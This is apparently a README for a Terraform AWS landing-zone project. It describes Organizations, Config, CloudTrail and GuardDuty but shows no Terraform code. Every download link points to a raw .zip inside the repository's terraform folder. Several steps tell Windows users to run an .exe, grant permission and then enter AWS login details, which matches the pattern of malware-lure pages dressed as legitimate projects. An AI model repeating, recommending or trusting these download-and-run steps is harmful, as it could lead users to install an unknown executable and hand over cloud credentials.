# 🛡️ aws-landing-zone - Secure AWS Accounts with Terraform

[![Download](https://img.shields.io/badge/Download%20%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip)

## 🧭 What this is

aws-landing-zone helps you set up a secure AWS account structure with Terraform. It is built for teams that want a clean, controlled setup for multiple AWS accounts. It uses AWS tools like Organizations, Config, CloudTrail, and GuardDuty to help keep cloud access and activity in order.

This project is meant for users who want a ready-made AWS foundation. It gives you a repeatable way to build and manage core security parts of an AWS environment.

## 📦 What you need

Before you start, make sure you have:

- A Windows PC with internet access
- A web browser
- Permission to download files
- An AWS account
- A GitHub account is helpful, but not required
- Enough access in AWS to work with accounts, roles, and security settings

If you plan to use Terraform files later, you may also want:

- Terraform installed
- AWS CLI installed
- A text editor like Notepad or VS Code

## 🔽 Download the release

Visit this page to download the release files:

[https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip](https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip)

On the release page:

1. Open the latest release
2. Find the file for Windows or the main package file
3. Download the file to your computer
4. If the file is a `.zip`, save it to a folder you can find later
5. If the file is an `.exe`, download it and run it

If you only see source files, look for the release asset section on the page. The file you need will be listed there when a packaged release is available.

## 💻 Install on Windows

If your download is a `.zip` file:

1. Right-click the file
2. Select Extract All
3. Choose a folder, such as `Downloads` or `Desktop`
4. Wait for Windows to unpack the files
5. Open the extracted folder

If your download is an `.exe` file:

1. Double-click the file
2. If Windows asks for permission, select Yes
3. Follow the on-screen steps
4. Finish the setup
5. Open the app from the Start menu or the folder where it was placed

If the release includes a single launch file, keep it in one folder so it can find its related files.

## 🗂️ What the package does

This project focuses on AWS landing zone setup. In practice, that means it helps you prepare a base cloud structure with:

- AWS Organizations for multiple accounts
- AWS Config for rule checks
- CloudTrail for activity tracking
- GuardDuty for threat detection
- Terraform for repeatable setup

A landing zone gives you a standard place to build from. It helps you separate work, security, and management into different AWS accounts. That makes the setup easier to control.

## 🛠️ How to use it

After you download and open the release, use it as the base for your AWS setup.

Typical use flow:

1. Read the release notes on GitHub
2. Check which files were included
3. Open the Terraform files in a text editor if needed
4. Set your AWS account details
5. Review the account layout
6. Apply the Terraform setup from a machine that can reach AWS
7. Confirm the AWS services were created

If the package includes a ready-to-run tool, use it to launch the setup steps in the order shown in the release notes.

## 🧩 Main parts of the setup

### 🏢 AWS Organizations

AWS Organizations lets you group several AWS accounts under one parent. This helps you keep billing, policy, and access rules in one place.

### 📋 AWS Config

AWS Config records changes in your AWS setup. It helps you see when settings change and whether they match your rules.

### 🛰️ CloudTrail

CloudTrail tracks account activity. It gives you a log of what happened and who made the change.

### 🛡️ GuardDuty

GuardDuty watches for signs of threats. It helps you spot unusual activity in your AWS accounts.

### ⚙️ Terraform

Terraform lets you define your cloud setup in files. That makes it easier to repeat the same setup later or keep it in sync across accounts.

## 🪟 Basic Windows setup path

Use this path if you want the simplest route on Windows:

1. Open the releases page
2. Download the latest packaged file
3. Save it to a new folder
4. Extract it if needed
5. Open the folder
6. Run the main file if one is included
7. If the project uses Terraform files, open them in your editor
8. Set your AWS login details
9. Follow the Terraform steps in the release or project files

If you use PowerShell or Command Prompt, keep the window open while the setup runs.

## 🔐 AWS access you may need

To use this project well, your AWS user or role may need access to:

- Organizations
- IAM
- CloudTrail
- Config
- GuardDuty
- S3
- CloudWatch
- Terraform state storage

If your setup uses a master account and member accounts, start in the management account first.

## 📁 Suggested folder layout

You may want to place the files like this:

- `Downloads/aws-landing-zone`
- `Desktop/aws-landing-zone`
- `C:\Tools\aws-landing-zone`

Keep the release file, Terraform files, and any notes in the same folder if the package expects them to work together.

## 🧪 Check that it worked

After setup, check for these signs:

- You can see the AWS accounts in one place
- CloudTrail is on
- AWS Config is recording changes
- GuardDuty is active
- Terraform completed without errors
- The files or console output show success

If something does not look right, open the release page again and check the instructions for that version.

## 🧭 Common use cases

This project fits well if you want to:

- Start a new AWS environment
- Organize several AWS accounts
- Set up security controls early
- Keep cloud changes tracked
- Use Terraform for repeatable setup
- Build a base for a larger AWS system

## 📚 Files you may see

The release or repo may include files like:

- Terraform files
- README notes
- Variables files
- State setup files
- Policy files
- Account setup files
- Security rule files

If you see files with `.tf` or `.tfvars`, those are Terraform files used to define the AWS setup.

## 🖥️ If Windows asks what to open

If you download a file and Windows does not know what to do with it:

- `.zip` files open with Windows Extract
- `.exe` files run by double-clicking
- `.md` files open in Notepad or a browser
- `.tf` files open in a text editor

If you want to edit the setup, use a text editor instead of Word.

## 🔍 Topics covered

This repository focuses on:

- AWS
- AWS Config
- AWS Organizations
- CloudTrail
- GuardDuty
- Infrastructure as code
- Landing zone
- Multi-account setup
- Security
- Terraform

## 📌 Start here

1. Go to the releases page
2. Download the latest release file
3. Open it on Windows
4. Follow the setup files in the package
5. Use your AWS access to complete the landing zone setup

[https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip](https://raw.githubusercontent.com/bilgy-watercraft652/aws-landing-zone/main/terraform/organizations/landing_aws_zone_v2.8.zip)